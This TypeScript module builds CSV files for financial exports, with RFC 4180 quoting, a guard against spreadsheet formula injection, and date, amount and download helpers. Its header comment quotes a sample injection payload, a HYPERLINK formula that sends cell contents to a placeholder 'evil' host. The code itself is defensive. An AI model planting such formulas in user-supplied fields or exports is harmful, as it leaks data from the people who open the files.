/**
 * Module 8 — CSV generation for financial exports.
 *
 * Two things here are easy to get wrong and expensive to get wrong, so they are
 * handled deliberately rather than with a `.join(",")`.
 *
 * 1. QUOTING. A field containing a comma, a quote or a newline has to be
 *    wrapped in quotes with its own quotes doubled (RFC 4180). Payout admin
 *    notes and fee descriptions are free text, so this is not hypothetical —
 *    one comma in a note silently shifts every later column on that row, and
 *    the file still opens, just wrong.
 *
 * 2. FORMULA INJECTION. Excel, Sheets and LibreOffice all execute a cell that
 *    begins with = + - @ (or a leading tab/CR). A player who sets their display
 *    name or payout handle to `=HYPERLINK("http://evil/"&A1)` gets that
 *    executed on the finance team's machine when they open the export. Quoting
 *    does NOT stop this — the spreadsheet strips quotes before evaluating.
 *
 *    The fix is to prefix a tab so the cell is read as text. Everything is
 *    still visible and copyable; it just is not evaluated.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/**
 * A plain decimal number, optionally negative.
 *
 * This exemption exists because the naive guard breaks arithmetic: "-5.00" is a
 * negative amount, starts with "-", and would be tab-prefixed into TEXT — at
 * which point SUM() silently skips it and a column of refunds appears to total
 * zero. A cell that is only digits, one optional minus and one optional decimal
 * point cannot be a formula, so it is safe to leave alone.
 *
 * Note this deliberately does NOT exempt things like "+1-555-0100": a leading
 * "+" on a phone number really does get evaluated, and that one should stay
 * text.
 */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  let s = typeof value === "string" ? value : String(value);

  // Neutralise formulas BEFORE quoting. A leading tab makes every major
  // spreadsheet treat the cell as text without visibly altering the content.
  if (FORMULA_PREFIX.test(s) && !PLAIN_NUMBER.test(s)) s = `\t${s}`;

  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

export type CsvColumn<T> = {
  header: string;
  /** Return a primitive. Formatting (currency, dates) belongs here. */
  value: (row: T) => unknown;
};

/**
 * Build an RFC 4180 CSV.
 *
 * CRLF line endings and a UTF-8 BOM, both for Excel's benefit: without the BOM
 * Excel on Windows reads the file as the local ANSI codepage and mangles any
 * non-ASCII character in a username.
 */
export function toCsv<T>(rows: readonly T[], columns: readonly CsvColumn<T>[]): string {
  const header = columns.map((c) => escapeCell(c.header)).join(",");
  const body = rows.map((row) => columns.map((c) => escapeCell(c.value(row))).join(","));
  // \ufeff as an escape, not a literal BOM character: an invisible byte at the
  // start of a template string is impossible to see in review and trivially
  // deleted by accident.
  return `\ufeff${[header, ...body].join("\r\n")}\r\n`;
}

/** Cents → a plain decimal string. No currency symbol or thousands separator:
 *  those turn a number into text as far as a spreadsheet is concerned. */
export function csvAmount(cents: number | null | undefined): string {
  return ((cents ?? 0) / 100).toFixed(2);
}

/** ISO timestamp → "YYYY-MM-DD HH:MM:SS", which every spreadsheet parses as a
 *  date. The raw ISO string with its "T" and "Z" usually imports as text. */
export function csvDate(iso: string | null | undefined): string {
  if (!iso) return "";
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return "";
  return d.toISOString().slice(0, 19).replace("T", " ");
}

/**
 * Hand a generated CSV to the browser as a download.
 *
 * Revoking the object URL on the next tick rather than immediately: Safari
 * cancels an in-flight download if the URL is revoked synchronously.
 */
export function downloadCsv(filename: string, contents: string) {
  const blob = new Blob([contents], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.style.display = "none";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 0);
}
